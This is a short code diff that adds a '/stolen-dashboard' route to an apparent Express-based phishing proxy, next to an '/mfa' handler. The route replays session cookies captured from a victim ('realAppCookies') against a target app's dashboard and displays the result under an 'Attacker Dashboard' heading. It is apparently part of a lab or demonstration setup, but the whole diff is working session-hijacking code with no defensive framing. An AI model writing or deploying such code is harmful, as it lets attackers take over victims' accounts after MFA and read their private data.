@@ -173,6 +173,54 @@ app.post('/mfa', async (req, res) => {
   }
 });
 
+app.get(
+  '/stolen-dashboard',
+  async (req, res) => {
+
+    const cookies =
+      req.session.realAppCookies;
+
+    if (!cookies) {
+
+      return res.send(
+        'No stolen session'
+      );
+    }
+
+    try {
+
+      const response =
+        await axios.get(
+          'http://app:3000/dashboard',
+          {
+            headers: {
+              Cookie:
+                cookies.join(';'),
+            },
+            maxRedirects: 0,
+            validateStatus: () => true,
+          }
+        );
+
+      res.send(`
+        <h1>
+          Attacker Dashboard
+        </h1>
+
+        ${response.data}
+      `);
+
+    } catch (err) {
+
+      console.error(err);
+
+      res.send(
+        'Failed to access dashboard'
+      );
+    }
+  }
+);
+
 app.listen(4000, () => {
 
   console.log(
